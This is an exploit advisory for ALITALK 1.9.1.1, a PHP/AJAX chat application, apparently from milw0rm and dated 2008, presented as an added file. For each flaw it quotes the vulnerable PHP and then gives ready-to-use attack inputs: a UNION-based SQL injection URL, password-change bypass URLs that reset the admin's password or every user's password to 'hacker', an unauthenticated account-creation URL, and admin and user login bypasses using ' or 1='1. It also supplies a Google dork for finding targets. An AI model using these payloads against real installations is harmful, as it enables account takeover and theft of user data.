@@ -1,0 +1,139 @@
+######################################################################
+# ALITALK v 1.9.1.1 Multiple Vulnerabilities                         #
+# author      : tomplixsee                                           #
+# google dork : POWERED BY ALITALK                                   #
+# download    : http://www.alilg.com/software/free-php-ajax-chat/    #                             
+######################################################################
+
+#################
+# SQL INJECTION # 
+#################
+# you need to login in order to exploit this vulnerability
+# vulnerable code on inc/receivertwo.php
+# <?
+# .....
+# if($_GET['turnadd']==1)
+# {
+# $rmusr=0;
+# $rmmzyiz=mysql_query("SELECT * from ".$alitalk_base['dbprefix']."users where room='".$_GET['mohit']."'");
+# while ($rmuiz=mysql_fetch_array($rmmzyiz))
+# {
+# echo"<rmusj>";
+# echo" r%#dtr onmouseout=\"detailsclo()\" onmouseover=\"details(event,'".$rmuiz[gender]."','".$rmuiz[age]."','".$rmuiz[username]."','".$rmuiz[location]."')\" ondblclick=\"ums('".$rmuiz[uid]."','".$rmuiz[username]."','".""."')\" b*%d
+# r%#dtd width='19'b*%d r%#dimg src=\"pix/room_user.gif\"b*%dr%#d/tdb*%d
+# r%#dtd class='roomuser'b*%dr%#dfont unselectable='on' style=\"cursor: default;\"b*%d $rmuiz[username] r%#d/tdb*%d
+# r%#d/trb*%d";
+# $rmusr++;
+# echo"</rmusj>";
+# }
+# ....
+# ?>
+#
+# example:
+# http://target/path/alitalk/inc/receivertwo.php?uid=1&mohit=y'+union+select+user(),2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2+from+alitalk_users+where+uid='1&turnadd=1&melody=0&lilil=400
+
+
+###########################
+# PASSWORD CHANGE BYPASS  #
+###########################
+# vulnerable code on functionz/usercp.php
+# <?
+# .....
+# function newpass($db,$id)
+# {
+# $nat=md5($_GET['old'].$_GET['old']);
+# $nao=md5($_GET['new'].$_GET['new']);
+# $threeyiz=mysql_query("SELECT * from ".$db."users where uid='".$id."' and password='".md5(md5($_GET['old']).$nat)."'");
+# $yiz=mysql_fetch_array($threeyiz);
+# if(!$yiz)
+# {
+# echo "Old Password is Wrong!";
+# }
+# else
+# {
+# mysql_query("UPDATE ".$db."users SET password='".md5(md5($_GET['new']).$nao)."' WHERE uid='".$id."'");
+# mysql_query("UPDATE ".$db."users SET salt='".$nao."' WHERE uid='".$id."'");
+# mpl($db,$id);
+# }
+# }
+# .....
+# ?>
+# examples:
+# http://target/path/inc/usercp.php?action=newpass&id=1' or password='&lilil=400&new=hacker
+# this will change password to "hacker" for user with uid = 1 (admin).
+# 
+# http://target/path/inc/usercp.php?action=newpass&id=1' or 1='1&lilil=400&new=hacker
+# this will change ALL passwords to "hacker".
+
+
+############################
+# USER REGISTRATION BYPASS #
+############################
+# vulnerable code on inc/elementz.php:
+# <?
+# ......
+# if($_GET['lilil']!=="".$_SESSION['lilol'].""){return false;}
+# include"setting.php";
+# $analuze=mysql_query("SELECT username from ".$alitalk_base['dbprefix']."users where username='".$_GET['ubild']."' and type='alitalk'");
+# $analuzeed=mysql_fetch_array($analuze);
+# if($analuzeed)
+# {
+# echo "Fatal Error";
+# }
+# else
+# {
+# $nat=md5($_GET['pa'].$_GET['pa']);
+# $pass=md5(md5($_GET['pa']).$nat);
+# mysql_query("INSERT into ".$alitalk_base['dbprefix']."users (firstname,lastname,gender,age,username,password,salt,joindate,addz,type) values('".$_GET['fn']."','".$_GET['ln']."','".$_GET['gender']."','".$_GET['age']."','".$_GET['ubild']."','".$pass."','".$nat."','".date("F j, Y")."','$uid','alitalk')");
+# ....
+# ?>
+# example:
+# http://target/path/inc/elementz.php?lilil=400&ubild=hacker&pa=hacker
+# this will add an account with username=hacker and password=hacker
+
+
+#############################
+# ADMIN LOGIN SQL INJECTION #
+#############################
+# code on admin/index.php
+# <?
+# .......
+# else if($_POST['signin'])
+# {
+# include "../functionz/first_process.php";
+# include "../inc/setting.php";
+# addin($_POST['username'],$_POST['password'],$alitalk_base['dbprefix']);
+# }
+# .....
+# ?>
+# 
+# vulnerable code on functionz/first_process.php
+# <?
+# ......
+# function addin($lamerz,$killer,$josh)
+# {
+# session_start();
+# $nat=md5($killer.$killer);
+# $analuze=mysql_query("SELECT * FROM ".$josh."info WHERE admin='".$lamerz."' AND password='".md5(md5($killer).$nat)."'");
+# $analuzeed=mysql_fetch_array($analuze);
+# if($analuzeed)
+# {
+# $_SESSION['adazsar']=1;
+# ......
+# ?>
+#
+# admin login page= http://target/path/admin
+# example:
+#  admin ID = adminusername' or 1='1
+#  password = whatever
+
+
+############################
+# USER LOGIN SQL INJECTION #
+############################
+#
+# example:
+#  ID = an_userID' or 1='1
+#  password = whatever
+
+# milw0rm.com [2008-01-16]
